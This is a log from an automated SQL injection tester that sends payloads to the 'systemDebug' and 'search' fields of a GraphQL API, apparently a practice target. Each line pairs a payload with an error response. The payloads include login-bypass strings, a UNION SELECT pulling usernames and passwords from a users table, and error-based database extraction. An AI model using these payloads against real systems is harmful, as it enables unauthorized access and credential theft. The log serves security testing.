2026-02-02 23:16:05,232 | INFO    | InjectionTester      | admin_comment_hash             | systemDebug.arg      | POST | success  |  0.002s | payload=[admin' #] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 38}]}]}]
2026-02-02 23:16:05,235 | INFO    | InjectionTester      | admin_comment_star             | systemDebug.arg      | POST | success  |  0.002s | payload=[admin'/*] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 38}]}]}]
2026-02-02 23:16:05,238 | INFO    | InjectionTester      | union_select_123               | systemDebug.arg      | POST | success  |  0.002s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 53}]}]}]
2026-02-02 23:16:05,240 | INFO    | InjectionTester      | union_select_users             | systemDebug.arg      | POST | success  |  0.002s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 85}]}]}]
2026-02-02 23:16:05,243 | INFO    | InjectionTester      | error_based_version            | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 151}]}]}]
2026-02-02 23:16:05,245 | INFO    | InjectionTester      | error_based_extractvalue       | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 95}]}]}]
2026-02-02 23:16:05,248 | INFO    | InjectionTester      | boolean_true                   | systemDebug.arg      | POST | success  |  0.002s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 42}]}]}]
2026-02-02 23:16:05,251 | INFO    | InjectionTester      | boolean_false                  | systemDebug.arg      | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 42}]}]}]
2026-02-02 23:16:05,254 | INFO    | InjectionTester      | single_quote                   | search.keyword       | POST | success  |  0.002s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 32}]}, {…]
2026-02-02 23:16:05,256 | INFO    | InjectionTester      | or_1_eq_1_dash                 | search.keyword       | POST | success  |  0.002s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 42}]}, {…]
2026-02-02 23:16:05,259 | INFO    | InjectionTester      | or_string_eq                   | search.keyword       | POST | success  |  0.002s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 42}]}, {…]
2026-02-02 23:16:05,261 | INFO    | InjectionTester      | double_quote_or                | search.keyword       | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:31) Expected :, found String\n\n1: query { search(keyword: \"\" OR \"\"=\"\") { id message error success } }\n                                 ^\n", "l…]
2026-02-02 23:16:05,263 | INFO    | InjectionTester      | double_quote_1_eq_1            | search.keyword       | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:31) Expected :, found Int \"1\"\n\n1: query { search(keyword: \"\" OR 1=1 --\") { id message error success } }\n                                 ^\n", …]
2026-02-02 23:16:05,267 | INFO    | InjectionTester      | or_1_eq_1_hash                 | search.keyword       | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 41}]}, {…]
2026-02-02 23:16:05,270 | INFO    | InjectionTester      | admin_comment_dash             | search.keyword       | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 40}]}, {…]
2026-02-02 23:16:05,272 | INFO    | InjectionTester      | admin_comment_hash             | search.keyword       | POST | success  |  0.002s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 39}]}, {…]
2026-02-02 23:16:05,275 | INFO    | InjectionTester      | admin_comment_star             | search.keyword       | POST | success  |  0.002s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 39}]}, {…]
